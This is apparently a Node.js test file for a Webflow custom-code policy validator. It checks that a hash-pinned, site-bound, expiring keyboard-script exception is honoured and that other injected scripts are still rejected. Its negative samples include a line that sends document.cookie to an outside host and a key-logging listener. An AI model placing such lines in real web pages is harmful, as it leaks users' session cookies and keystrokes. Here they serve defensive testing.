import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';
import { createHash } from 'node:crypto';
import { reviewedScript } from '../src/reviewed-scripts/archoba.js';
import { exception, matchesReviewedKeyboardException } from '../src/reviewed-keyboard-exception.js';
import { findProhibitedMarketplaceCustomCode } from '../src/font-custom-code-policy.js';
const html = `<html data-wf-site="${exception.siteId}"><script>${reviewedScript}</script></html>`;
const url = 'https://archoba.webflow.io/';
const now = Date.parse('2026-09-11T12:00:00Z');
assert.equal(createHash('sha256').update(reviewedScript).digest('hex'), exception.sha256);
assert.equal(matchesReviewedKeyboardException(reviewedScript, html, url, now), true);
for (const args of [
  [reviewedScript + '\n// change', html, url, now],
  [reviewedScript, html, 'https://other.webflow.io', now],
  [reviewedScript, html.replace(exception.siteId, 'other'), url, now],
  [reviewedScript, html, url, Date.parse(exception.expiresAt)],
  [reviewedScript, html, undefined, now]
]) assert.equal(matchesReviewedKeyboardException(...args), false);
const source = fs.readFileSync(new URL('../src/worker.js', import.meta.url), 'utf8');
const endMarker = '__name(containsPotentiallyHarmfulCode, "containsPotentiallyHarmfulCode");';
const sandbox = { console, Set, URL, findProhibitedMarketplaceCustomCode,
  matchesReviewedKeyboardException: (s,h,u) => matchesReviewedKeyboardException(s,h,u,now), __name: t => t };
vm.createContext(sandbox);
vm.runInContext(source.slice(source.indexOf('var IX2_REJECTION_MESSAGE'),source.indexOf(endMarker)+endMarker.length), sandbox);
const result = sandbox.validateGsapUsage(html,url);
console.log(JSON.stringify(result.summary));
assert.equal(result.summary.securityRiskCount, 0);
assert.equal(result.passed, false, 'Remaining custom-code policy must not be bypassed');
assert.ok(result.details.flaggedCode.some(f => f.message === 'Mixed GSAP usage with unapproved code'));
assert.equal(sandbox.validateGsapUsage(html,'https://other.webflow.io/').passed,false);
assert.equal(sandbox.validateGsapUsage(html.replace('/* Archova','/* modified Archova'),url).passed,false);
for (const script of [
  "document.addEventListener('keydown', e => console.log(e.key));",
  "fetch('https://example.com/' + document.cookie);",
  "document.body.textContent = 'unrelated custom functionality';"
]) assert.equal(sandbox.validateGsapUsage(html.replace('</html>',`<script>${script}</script></html>`),url).passed,false);
console.log('Reviewed keyboard exception positive and negative checks passed.');
